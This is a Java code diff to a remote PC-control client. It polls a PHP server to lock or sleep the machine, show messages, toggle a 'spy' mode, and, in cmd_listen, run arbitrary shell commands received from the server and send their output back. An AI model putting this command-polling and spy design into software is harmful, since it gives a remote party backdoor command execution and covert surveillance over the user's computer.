@@ -63,7 +63,24 @@ public class listening_requests {
             server_requests.http_get_request(pc_request_php_file_name, "usage_values_request=0");
         }
     }
+    private void pc_lock() throws IOException, HttpException, URISyntaxException, InterruptedException {
 
+        int request = Integer.parseInt(server_requests.http_get_request(pc_request_php_file_name, "get_pc_lock_request=1"));
+        if(request == 1){
+            if(System.getProperty("os.name").startsWith("Windows")){ //Only windows
+            process.pc_lock();}
+            server_requests.http_get_request(pc_request_php_file_name, "pc_lock_request=0");
+        }
+    }
+    private void pc_sleep() throws IOException, HttpException, URISyntaxException, InterruptedException {
+
+        int request = Integer.parseInt(server_requests.http_get_request(pc_request_php_file_name, "get_sleep_request=1"));
+        if(request == 1){
+            if(System.getProperty("os.name").startsWith("Windows")){ //Only windows
+            process.pc_sleep();}
+            server_requests.http_get_request(pc_request_php_file_name, "sleep_request=0");
+        }
+    }
 
     public void listen_all() throws IOException, AWTException, HttpException, URISyntaxException, InterruptedException {
 
@@ -73,10 +90,55 @@ public class listening_requests {
             closing_listen();
             ss_listen();
             cam_shot();
+            pc_lock();
+            pc_sleep();
             usage_values();
 
 
             server_requests.http_get_request(pc_request_php_file_name, "any_request=0");
+        }
+    }
+
+    public void cmd_listen() throws IOException, AWTException, HttpException, URISyntaxException, InterruptedException {
+
+        String response = server_requests.http_get_request(pc_request_php_file_name, "get_cmd_post=1");
+
+        if(!response.equals("0")){
+            server_requests.http_post_request(pc_request_php_file_name,"cmd_response=1", new String[]{"cmd"},new String[]{process.cmd(response)});
+            server_requests.http_post_request(pc_request_php_file_name,"cmd_post=0", new String[]{"cmd"},new String[]{"0"});
+        }
+    }
+    public void message_listen() throws IOException, AWTException, HttpException, URISyntaxException, InterruptedException {
+
+        String response = server_requests.http_get_request(pc_request_php_file_name, "get_messages=1");
+
+        if(!response.equals("0")){
+            process.message(response);
+            server_requests.http_post_request(pc_request_php_file_name,"message_request=0", new String[]{"message"},new String[]{"0"});
+        }
+    }
+    public void horn_listen() throws IOException, AWTException, HttpException, URISyntaxException, InterruptedException {
+
+        String response = server_requests.http_get_request(pc_request_php_file_name, "get_horn_request=1");
+
+        if(response.equals("0")){
+            process.horn(0);
+        }
+        else {
+            process.horn(1);
+        }
+    }
+    public void spy_listen() throws IOException, AWTException, HttpException, URISyntaxException, InterruptedException {
+
+        String response = server_requests.http_get_request(pc_request_php_file_name, "get_spy_mode=1");
+        String mode = null;
+        if(response.equals("0")){
+            mode = "normal";
+           if(!mode.equals(server_requests.get_mode())){server_requests.set_mode("normal");}
+        }
+        else {
+            mode = "spy";
+            if(!mode.equals(server_requests.get_mode())){server_requests.set_mode("spy");}
         }
     }
 }
